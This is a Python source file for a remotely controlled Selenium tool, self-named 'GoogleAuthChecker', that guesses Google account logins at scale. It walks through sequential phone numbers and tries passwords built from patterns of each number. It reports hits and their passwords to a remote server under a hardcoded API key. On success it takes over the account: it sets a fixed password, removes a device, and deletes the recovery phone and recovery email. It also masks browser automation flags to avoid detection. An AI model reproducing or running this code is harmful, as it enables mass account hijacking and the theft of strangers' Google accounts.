import threading
import time
import json
import os
import random
import traceback
import queue
import requests
import pathlib
import sys
import psutil

from functools import wraps
from queue import Empty
from dotenv import load_dotenv
from filelock import FileLock
from tenacity import retry, stop_after_attempt, wait_fixed
from postgrest.exceptions import APIError

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from supabase import create_client
from rich.console import Console
from rich.panel import Panel

from setup_logging import setup_logging
from runtime_paths import BASE_DIR, get_dotenv_path
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# ── Logging ────────────────────────────────────────────────────────────────
logger = setup_logging()
console = Console()
CHROME_FIXED_VERSION = "143.0.7499.146"

# ── Environment ────────────────────────────────────────────────────────────
get_dotenv_path()
load_dotenv(dotenv_path=get_dotenv_path())

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
MACHINE_ID   = os.getenv("MACHINE_ID")

try:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    print("Connected to Supabase successfully.")
except Exception as e:
    logger.error(f"Failed to create Supabase client: {e}")
    sys.exit(1)

# ── Constants ──────────────────────────────────────────────────────────────
TABLE_NAME     = "phone_logs"
SERVER_URL     = os.getenv("SERVER_API_URL")
API_KEY        = "d28a61c741d650a93446fa829e241dc1d948a0353d2aab25ad5e7440e5a60ab4"
MY_FOLDER      = "GoogleAuthChecker"
TIMEOUT        = 10

# ── FLUSH_INTERVAL ─────────────────────────────────────────────────────────
raw_value = os.environ.get("FLUSH_INTERVAL")
if raw_value is None:
    print("Notice: FLUSH_INTERVAL not found in environment. Using default: 900")
    FLUSH_INTERVAL = 900
else:
    try:
        FLUSH_INTERVAL = int(raw_value)
        print(f"FLUSH_INTERVAL set to {FLUSH_INTERVAL} seconds.")
    except ValueError:
        print(f"Warning: FLUSH_INTERVAL '{raw_value}' is not a valid integer. Using default: 900")
        FLUSH_INTERVAL = 900

# ── Shared state ───────────────────────────────────────────────────────────
active_threads: dict[str, threading.Thread] = {}
stop_events: dict[str, threading.Event] = {}
threads_lock = threading.Lock()

write_queue = queue.Queue(maxsize=0)
base_path = pathlib.Path.home() / "Desktop" / MY_FOLDER
base_path.mkdir(parents=True, exist_ok=True)

active_workers_count = 0
workers_count_lock = threading.Lock()


# ══════════════════════════════════════════════════════════════════════════════
#  FILE-WRITER BACKGROUND THREAD
# ══════════════════════════════════════════════════════════════════════════════
def file_writer_worker():
    buffer: dict[str, list] = {}
    last_flush = time.time()
    logger.info("File-writer thread started.")
    while True:
        try:
            try:
                data = write_queue.get(timeout=1.0)
            except Empty:
                data = "CHECK_FLUSH"

            if data is None:
                logger.info("File-writer: kill signal. Flushing remaining…")
                for status, items in buffer.items():
                    if items:
                        _flush_logs(items, status)
                break

            if data != "CHECK_FLUSH":
                status_name, log_entry = data
                buffer.setdefault(status_name, []).append(log_entry)
                write_queue.task_done()

            if time.time() - last_flush > FLUSH_INTERVAL:
                for sname in list(buffer.keys()):
                    if buffer[sname]:
                        _flush_logs(buffer[sname], sname)
                        buffer[sname] = []
                last_flush = time.time()

        except Exception as e:
            logger.error(f"File-writer loop error: {e}", exc_info=True)


def _flush_logs(items, status_name):
    try:
        headers  = {"X-API-Key": API_KEY, "Content-Type": "application/json"}
        payload  = {"tableName": TABLE_NAME, "data": items}
        response = requests.post(SERVER_URL, json=payload, headers=headers, timeout=10)
        if response.status_code != 201:
            logger.warning(f"Server returned {response.status_code}, saving locally.")
    except Exception as e:
        logger.error(f"Network flush error: {e}")
    _save_locally(status_name, items)


def save_progress(key_id: str, number_val: int, current_progress: int):
    """Write number + current_progress directly to Supabase."""
    try:
        res = supabase.from_("machines").select("config").eq("id", MACHINE_ID).single().execute()
        config_db = res.data.get("config", {}) if res.data else {}
        if key_id in config_db:
            config_db[key_id]["number"]           = number_val
            config_db[key_id]["current_progress"] = current_progress
            supabase.from_("machines").update({"config": config_db}).eq("id", MACHINE_ID).execute()
            logger.debug(f"Progress saved: key={key_id} number={number_val} progress={current_progress}")
    except Exception as e:
        logger.error(f"save_progress failed: {e}")


def _save_locally(status_name, items):
    file_path = base_path / f"{status_name}.txt"
    lock_path = str(file_path) + ".lock"
    try:
        with FileLock(lock_path).acquire(timeout=10):
            with open(file_path, "a") as f:
                for item in items:
                    f.write(json.dumps(item) + "\n---\n")
    except Exception as e:
        logger.critical(f"Could not write to {file_path}: {e}")


threading.Thread(target=file_writer_worker, daemon=True, name="FileWriter").start()


# ══════════════════════════════════════════════════════════════════════════════
#  SELENIUM HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def initialize_driver(vpn="1", browser_type="2"):
    option = webdriver.ChromeOptions()
    CHROME_DIR    = os.path.join(BASE_DIR, "chrome-bin")
    CHROME_BINARY = os.path.join(CHROME_DIR, "chrome-win64", "chrome.exe")
    CHROMEDRIVER  = os.path.join(CHROME_DIR, "chromedriver-win64", "chromedriver.exe")

    def download_chrome_if_missing():
        if os.path.exists(CHROME_BINARY) and os.path.exists(CHROMEDRIVER):
            return

        import urllib.request, zipfile, io, threading

        logger.info(f"Chrome not found. Downloading fixed version {CHROME_FIXED_VERSION}...")

        base_url = f"https://storage.googleapis.com/chrome-for-testing-public/{CHROME_FIXED_VERSION}/win64"
        os.makedirs(CHROME_DIR, exist_ok=True)

        errors = {}

        def download_and_extract(asset, zip_name, dest_check):
            if os.path.exists(dest_check):
                logger.info(f"{asset} already exists, skipping.")
                return
            url = f"{base_url}/{zip_name}"
            logger.info(f"Downloading {url} ...")
            try:
                with urllib.request.urlopen(url, timeout=60) as r:
                    total      = int(r.headers.get('Content-Length', 0))
                    chunk_size = 1024 * 64
                    data       = b""
                    downloaded = 0
                    while True:
                        chunk = r.read(chunk_size)
                        if not chunk:
                            break
                        data       += chunk
                        downloaded += len(chunk)
                        if total:
                            percent  = downloaded * 100 // total
                            mb_done  = downloaded / (1024 * 1024)
                            mb_total = total / (1024 * 1024)
                            print(f"\r  [{asset}] {percent}%  ({mb_done:.1f} / {mb_total:.1f} MB)", end="", flush=True)
                print()
                print(f"  Extracting {zip_name}...")
                with zipfile.ZipFile(io.BytesIO(data)) as z:
                    z.extractall(CHROME_DIR)
                logger.info(f"✔ {asset} v{CHROME_FIXED_VERSION} ready.")
            except Exception as e:
                errors[asset] = e
                print(f"\n  ✘ {asset} download failed: {e}")

        assets = [
            ("chrome",       "chrome-win64.zip",      CHROME_BINARY),
            ("chromedriver", "chromedriver-win64.zip", CHROMEDRIVER),
        ]

        threads = [
            threading.Thread(target=download_and_extract, args=(asset, zip_name, dest_check), name=f"dl-{asset}")
            for asset, zip_name, dest_check in assets
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        if errors:
            raise RuntimeError(f"Download failed for: {list(errors.keys())} → {errors}")

        print("  ✔ All binaries ready. Starting driver...\n")

    download_chrome_if_missing()

    if browser_type == "1":
        brave_path = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
        if not os.path.exists(brave_path):
            raise FileNotFoundError("Brave not found. Install it or use Chrome.")
        option.binary_location = brave_path

    option.add_experimental_option("excludeSwitches", ["enable-automation"])
    option.add_experimental_option("useAutomationExtension", False)
    option.add_experimental_option("detach", True)

    is_headless = os.environ.get("HEADLESS_MODE", "false").lower() == "true"
    if is_headless:
        option.add_argument("--headless")

    if vpn == "2":
        option.add_extension("VeePN.crx")

    option.binary_location = CHROME_BINARY
    driver = webdriver.Chrome(options=option, service=Service(executable_path=CHROMEDRIVER))

    screen_width  = random.randint(0, 1920)
    screen_height = random.randint(0, 1080)
    x = random.randint(0, screen_width)
    y = random.randint(0, screen_height)
    driver.set_window_position(x, y)
    driver.set_window_size(500, 550)
    return driver


def apply_pattern(raw_number: str, pattern_dict: dict):
    if not pattern_dict:
        return None
    start  = pattern_dict["drop_start"]
    end    = -pattern_dict["drop_end"] if pattern_dict["drop_end"] > 0 else None
    middle = str(raw_number)[start:end]
    result = f"{pattern_dict['prefix']}{middle}{pattern_dict['suffix']}"
    return None if result == str(raw_number) else result


def parse_password_patterns(password_str: str):
    combos  = password_str.split(",")
    default = {"prefix": "", "drop_start": 0, "drop_end": 0, "suffix": ""}
    patterns = []
    for combo in combos:
        parts = combo.split("-")
        if len(parts) == 4:
            patterns.append({
                "prefix":     parts[0],
                "drop_start": int(parts[1]) if parts[1].isdigit() else 0,
                "drop_end":   int(parts[2]) if parts[2].isdigit() else 0,
                "suffix":     parts[3],
            })
        else:
            patterns.append(default.copy())
    return patterns


def autochange(driver, password_val):
    driver.set_window_size(500, 550)
    driver.get("https://myaccount.google.com/security?")
    time.sleep(2)
    # Remove device
    try:
        img_sel = 'img[src="https://www.gstatic.com/identity/boq/accountsettingsmobile/devicesrealistic_laptop_windows_36x36_d96da2feed149a963e724d1f629e8701.png"]'
        driver.find_element(By.CSS_SELECTOR, img_sel).click()
        time.sleep(2)
        WebDriverWait(driver, TIMEOUT).until(EC.element_to_be_clickable((By.XPATH, '//div[@class="dMNVAe"]'))).click()
        time.sleep(1)
        driver.find_element(By.XPATH, '(//span[@class="VfPpkd-vQzf8d"])[4]').click()
    except Exception:
        pass
    # Change password
    try:
        driver.get("https://myaccount.google.com/signinoptions/password")
        time.sleep(2)
        pf = WebDriverWait(driver, TIMEOUT).until(EC.visibility_of_element_located((By.XPATH, '//input[@name="password"]')))
        pf.clear(); pf.send_keys(password_val)
        cf = driver.find_element(By.XPATH, '//input[@name="confirmation_password"]')
        cf.clear(); cf.send_keys(password_val)
        driver.find_element(By.XPATH, '//*[@id="yDmH0d"]/div[13]/div[2]/div/div[2]/button[2]/span').click()
        time.sleep(2)
    except Exception:
        pass
    # Remove recovery phone
    try:
        driver.get("https://myaccount.google.com/signinoptions/rescuephone")
        time.sleep(2)
        WebDriverWait(driver, TIMEOUT).until(EC.element_to_be_clickable((By.XPATH, '//span[text()="Remove number"]'))).click()
        time.sleep(1)
        driver.find_element(By.XPATH, '//button[@aria-label="Remove phone number"]').click()
        time.sleep(1)
    except Exception:
        pass
    # Remove recovery email
    try:
        driver.get("https://myaccount.google.com/recovery/email")
        time.sleep(2)
        WebDriverWait(driver, TIMEOUT).until(EC.element_to_be_clickable((By.XPATH, '//button[@aria-label="Remove recovery email"]'))).click()
    except Exception:
        pass


def login_to_gmail(number_val, driver, parsed_patterns: list, wq: queue.Queue):
    """Log in to Gmail with combo list entries."""
    i = str(number_val)
    wait = WebDriverWait(driver, timeout=2, poll_frequency=0.001)
    def enqueue(status, pwd=""):
        wq.put((status, {"phone_number": i, "status": status, "password": pwd}))

    for p_chake in range(10):
        start_time = time.time()
        try:
            initial_url = driver.current_url

            try:
                username_field = WebDriverWait(driver, 4, poll_frequency=1).until(
                    EC.element_to_be_clickable((By.ID, "identifierId"))
                )
            except:
                driver.get("https://accounts.google.com/")
                continue

            try:
                username_field.clear()
                username_field.send_keys('+' + i)
                username_field.send_keys(Keys.RETURN)
            except:
                driver.get("https://accounts.google.com/")
                continue

            try:
                wait.until(EC.any_of(
                    EC.presence_of_element_located((By.XPATH, '//input[@aria-invalid="true"]')),
                    EC.url_changes(driver.current_url)
                ))
            except:
                pass

            is_wrong = driver.find_elements(By.XPATH, "//input[@aria-invalid=\"true\"]")
            if len(is_wrong) > 0:
                return

            img = driver.find_elements(By.XPATH, '//img[@jsname="O9Milc"]')
            if len(img) > 0:
                rect = img[0].rect
                if rect['width'] != 0 and rect['height'] != 0:
                    driver.get("https://accounts.google.com/")
                    continue

            current_url = driver.current_url
            url_check_start = time.time()

            if "https://accounts.google.com/v3/signin/rejected?" in current_url:
                driver.get("https://accounts.google.com/")
                break
            if "https://accounts.google.com/v3/signin/challenge/recaptcha?" in current_url:
                driver.get("https://accounts.google.com/")
                break
            if "https://accounts.google.com/v3/signin/identifier?continue" in current_url:
                img = driver.find_elements(By.XPATH, '//img[@jsname="O9Milc"]')
                if len(img) > 0:
                    rect = img[0].rect
                    if rect['width'] != 0 and rect['height'] != 0:
                        logger.info(f"[cond] profile-image-detected-url [{current_url}] in {time.time() - url_check_start:.3f}s")
                        driver.get("https://accounts.google.com/")
                        continue

            url_check_pw_stage = time.time()
            if "https://accounts.google.com/v3/signin/challenge/pwd?" in current_url:
                password_field = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, "//input[@aria-label='Enter your password']"))
                )
                for r in parsed_patterns:
                    original_url = driver.current_url
                    password_val = apply_pattern(i, r)
                    if password_val is None:
                        driver.back()
                        break

                    t_now = time.time()
                    console.print("[", int(t_now - start_time), "] " + i + " - Trying password: " + password_val, style="yellow")
                    password_field.clear()
                    password_field.send_keys(password_val)
                    password_field.send_keys(Keys.RETURN)

                    try:
                        wait.until(EC.any_of(
                            EC.presence_of_element_located((By.XPATH, '//input[@aria-invalid="true"]')),
                            EC.url_changes(driver.current_url)
                        ))
                    except:
                        driver.get("https://accounts.google.com/")
                        break

                    current_url = driver.current_url
                    is_wrong = driver.find_elements(By.XPATH, "//input[@aria-invalid=\"true\"]")
                    if is_wrong:
                        continue

                    img = driver.find_elements(By.XPATH, '//img[@jsname="O9Milc"]')
                    if len(img) > 0:
                        rect = img[0].rect
                        if rect['width'] != 0 and rect['height'] != 0:
                            driver.get("https://accounts.google.com/")
                            break

                    if "https://accounts.google.com/" in current_url:
                        try:
                            wrong = driver.find_element(By.XPATH, "//input[@aria-label='Enter your password' and @aria-invalid='true']")
                            continue
                        except:
                            pass

                    if "https://accounts.google.com/v3/signin/challenge/recaptcha?" in current_url:
                        driver.back()
                        break

                    if "https://accounts.google.com/v3/signin/rejected?" in current_url:
                        driver.get("https://accounts.google.com/")
                        break

                    if "https://accounts.google.com/signin/v2/speedbump/changepassword/changepasswordform?" in current_url:
                        enqueue("changing_password", password_val)
                        pass_field = driver.find_element(By.XPATH, '//input[@name="Passwd"]')
                        pass_field.send_keys("Mahfuz@67456")
                        confirm = driver.find_element(By.XPATH, '//input[@name="ConfirmPasswd"]')
                        confirm.send_keys("Mahfuz@67456")
                        confirm.send_keys(Keys.RETURN)
                        time.sleep(2)
                        break

                    for url_fragment, label, out_file in [
                        ("challenge/dp?",       "Matched 2 Steap",          "two_step"),
                        ("challenge/ootp?",     "Matched Phone Security code", "security_code"),
                        ("challenge/ipp/collect","Matched Phone Verify",     "phone_verify"),
                        ("challenge/ipp/consent","Matched Bell Icon",        "bell_icon"),
                        ("challenge/selection?","Matched Method Namber",     "method_number"),
                        ("challenge/iap?",      "Matched OTP Number",        "otp_number"),
                        ("/mail/u","Matched Direct Inbox",       "login_successful"),
                    ]:
                        if url_fragment in current_url:
                            enqueue(out_file, password_val)
                            break

                    if "https://gds.google.com/" in current_url or "https://myaccount.google.com/" in current_url:
                        print("---------------Login Successful---------------")
                        enqueue("login_successful", password_val)
                        autochange(driver, "Mahfuz@67456")
                        break

                driver.back()
                break

            elif "https://accounts.google.com/v3/signin/challenge/pwd?" in current_url:
                driver.back()
                break
            else:
                try:
                    break
                except:
                    pass
            break

        except Exception as e:
            break


# ══════════════════════════════════════════════════════════════════════════════
#  PER-KEY WORKER THREAD
# ══════════════════════════════════════════════════════════════════════════════
def handle_thread_exit(key_id: str):
    """Remove worker from tracking. If last one, set is_active=False."""
    global active_workers_count

    with threads_lock:
        active_threads.pop(key_id, None)
        stop_events.pop(key_id, None)
        remaining_keys = list(active_threads.keys())

    with workers_count_lock:
        active_workers_count = len(remaining_keys)

    if not remaining_keys:
        logger.info(f"Worker {key_id} was the last thread. Setting is_active=False.")
        try:
            supabase.table("machines").update({
                "is_active": False,
                "status": "idle",
            }).eq("id", MACHINE_ID).execute()
            logger.info("is_active=False set successfully.")
        except Exception as e:
            logger.error(f"handle_thread_exit: failed to set is_active=False: {e}")
    else:
        logger.info(f"Worker {key_id} finished. Still running: {remaining_keys}")


def worker_thread_fn(key_id: str, item_config: dict, stop_event: threading.Event):
    """Runs the Gmail login loop for one sequence key."""
    global active_workers_count

    number           = item_config["number"]
    password_str     = item_config.get("password", "-3-0-,-3-0-@,-3-0-#,-3-0-a,@-3-0-")
    limit            = item_config.get("limit", 100)
    current_progress = item_config.get("current_progress", 0)

    parsed_patterns = parse_password_patterns(password_str)
    worker_logger   = setup_logging(log_filename=f"worker_{key_id}.log", name=f"worker_{key_id}")
    worker_logger.info(f"Worker {key_id} started. number={number}, limit={limit}, progress={current_progress}")

    driver    = None
    ph_number = None

    if current_progress >= limit:
        worker_logger.info(f"Worker {key_id}: already at limit ({current_progress}/{limit}), nothing to do.")
        handle_thread_exit(key_id)
        return

    try:
        number_val = int(number)
    except Exception as e:
        worker_logger.error(f"Bad number value: {e}")
        handle_thread_exit(key_id)
        return

    remaining = limit - current_progress

    with workers_count_lock:
        active_workers_count += 1

    for i in range(remaining):
        if stop_event.is_set():
            worker_logger.info(f"Worker {key_id}: stop signal at step {i}.")
            break

        number_val       += 1
        ph_number         = number_val
        current_progress += 1

        if driver is None:
            try:
                driver = initialize_driver()
                driver.get("https://accounts.google.com/")
            except Exception as e:
                worker_logger.error(f"Driver init failed: {e}")
                number_val       -= 1
                current_progress -= 1
                continue

        if current_progress % 1000 == 0:
            try:
                driver.quit()
            except Exception:
                pass
            driver = None

        try:
            login_to_gmail(number_val, driver, parsed_patterns, write_queue)
        except Exception:
            worker_logger.error("login_to_gmail raised:", exc_info=True)
            try:
                driver.get("https://accounts.google.com/")
            except Exception:
                driver = None

        # ── Save progress every 5 iterations for better Admin Panel sync ──
        if i % 5 == 0:
            save_progress(key_id, number_val, current_progress)
            _save_number(number_val, key_id)

    if driver:
        try:
            driver.quit()
        except Exception:
            pass

    if ph_number is not None:
        save_progress(key_id, ph_number, current_progress)

    worker_logger.info(f"Worker {key_id} finished at progress={current_progress}.")
    handle_thread_exit(key_id)


def _save_number(number_val, key_id):
    path = os.path.join(BASE_DIR, f"number_{key_id}.json")
    try:
        with open(path, "w") as f:
            json.dump({"number": number_val}, f, indent=4)
    except Exception as e:
        logger.error(f"Failed to save number: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  MANAGE WORKERS — Remote control loop (NEW!)
# ══════════════════════════════════════════════════════════════════════════════
def _stop_all_workers(reason: str = ""):
    """Signal all running workers to stop."""
    with threads_lock:
        keys = list(stop_events.keys())
    if keys:
        logger.info(f"Stopping {len(keys)} workers. Reason: {reason}")
        for k in keys:
            stop_events[k].set()


def manage_workers():
    """
    Main controller loop. Reads machines.is_active from Supabase every N seconds:
      - is_active=True  → spawn workers for each key in config
      - is_active=False → signal all running workers to stop
    Also writes heartbeat (last_seen) so Admin Panel can show 'online'.
    """
    logger.info(f"manage_workers() started. Machine: {MACHINE_ID}")
    console.print(Panel.fit(
        f"[bold green]Checker Online[/]\n"
        f"Machine: [cyan]{MACHINE_ID}[/]\n"
        f"Polling Supabase every 5s…",
        title="v2.13",
        border_style="green",
    ))

    heartbeat_counter = 0

    while True:
        try:
            # ── 1. Read machine state from Supabase ───────────────────────
            res = supabase.from_("machines") \
                .select("is_active, config, status") \
                .eq("id", MACHINE_ID) \
                .single() \
                .execute()

            if not res.data:
                logger.error(f"Machine '{MACHINE_ID}' not found in Supabase machines table!")
                console.print(f"[red]✘ Machine '{MACHINE_ID}' missing in DB. Retrying…[/]")
                time.sleep(10)
                continue

            is_active = bool(res.data.get("is_active", False))
            config    = res.data.get("config") or {}

            with threads_lock:
                running_keys = set(active_threads.keys())

            # ── 2. Heartbeat every ~30 seconds ────────────────────────────
            heartbeat_counter += 1
            if heartbeat_counter % 6 == 0:  # 5s * 6 = 30s
                try:
                    supabase.table("machines").update({
                        "last_seen": "now()",
                        "active_workers": len(running_keys),
                    }).eq("id", MACHINE_ID).execute()
                except Exception as hb_err:
                    # Column না থাকলে ignore
                    logger.debug(f"Heartbeat update skipped: {hb_err}")

            # ── 3. If active: spawn missing workers ───────────────────────
            if is_active:
                for key_id, item_config in config.items():
                    if key_id in running_keys:
                        continue

                    # Validate config
                    if not item_config.get("number"):
                        logger.warning(f"Key '{key_id}' has no number — skipping.")
                        continue

                    # Skip already-finished workers
                    limit = int(item_config.get("limit", 100))
                    progress = int(item_config.get("current_progress", 0))
                    if progress >= limit:
                        logger.info(f"Key '{key_id}' already finished ({progress}/{limit}), skipping spawn.")
                        continue

                    stop_event = threading.Event()
                    t = threading.Thread(
                        target=worker_thread_fn,
                        args=(key_id, item_config, stop_event),
                        name=f"worker-{key_id}",
                        daemon=True,
                    )
                    with threads_lock:
                        active_threads[key_id] = t
                        stop_events[key_id] = stop_event
                    t.start()
                    logger.info(f"✔ Spawned worker: {key_id}")
                    console.print(f"[green]▶ Spawned worker:[/] {key_id}")

            # ── 4. If not active: stop all workers ────────────────────────
            else:
                if running_keys:
                    _stop_all_workers("is_active=False")
                    console.print("[yellow]⏸ Stopping all workers (is_active=False)[/]")
                    try:
                        supabase.table("machines").update({
                            "status": "stopping",
                        }).eq("id", MACHINE_ID).execute()
                    except Exception:
                        pass

        except APIError as api_err:
            logger.error(f"Supabase API error in manage_workers: {api_err}")
        except Exception as e:
            logger.error(f"manage_workers loop error: {e}", exc_info=True)

        time.sleep(5)  # poll interval


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print(f"Machine ID : {MACHINE_ID}")
    print("→ (v2.13) Combined Remote-Control + Worker started (threaded mode)")
    print("→ Heartbeat + manage_workers active. Polling is_active flag…")
    try:
        manage_workers()   # blocks forever
    except KeyboardInterrupt:
        logger.info("KeyboardInterrupt — shutting down.")
        _stop_all_workers("KeyboardInterrupt")
        time.sleep(2)
        try:
            write_queue.put(None)  # kill file writer
        except Exception:
            pass
        console.print("\n[red]Checker stopped.[/]")